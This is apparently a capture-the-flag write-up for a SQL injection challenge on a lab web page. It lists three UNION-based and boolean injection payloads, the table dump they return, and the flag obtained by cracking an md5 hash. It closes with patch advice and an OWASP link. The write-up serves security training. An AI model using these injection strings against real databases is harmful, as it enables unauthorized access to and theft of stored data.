# SQL Injection

On the page `http://192.168.56.2/?page=searchimg`, we can write SQL command in the input field to get access to what is store in the database.

Making those commands will get us the flag.

```sql
1 or TRUE
1 UNION select table_schema,table_name FROM information_Schema.tables
1 UNION select comment, title FROM list_images
```
 The last command gives us this result: 

```
ID: 1 UNION select comment, title FROM list_images. 
Title: Hack me ?  
Url : If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

The word behind this md5 is **albatroz**. The sha256 of it gives us the flag.

** FLAG: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188**
 
## DESCRIPTION

SQL Injection occurs when an attacker is able to manipulate a SQL query by injecting malicious SQL code into an input field, which the application then executes. This can lead to unauthorized access to the database, data leakage, data manipulation, and other serious security issues.

## PATCH

1.  **Input Validation**: Validate user inputs to ensure they conform to expected formats before processing them.
    
2.  **Least Privilege Principle**: Ensure the database user account used by your application has the minimum privileges necessary to perform its tasks.
    
3.  **Stored Procedures**: Use stored procedures to handle database operations, which can help prevent some types of SQL Injection attacks.
    
4.  **Web Application Firewalls (WAF)**: Deploy a WAF to detect and block SQL Injection attempts.

## DOC

- [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)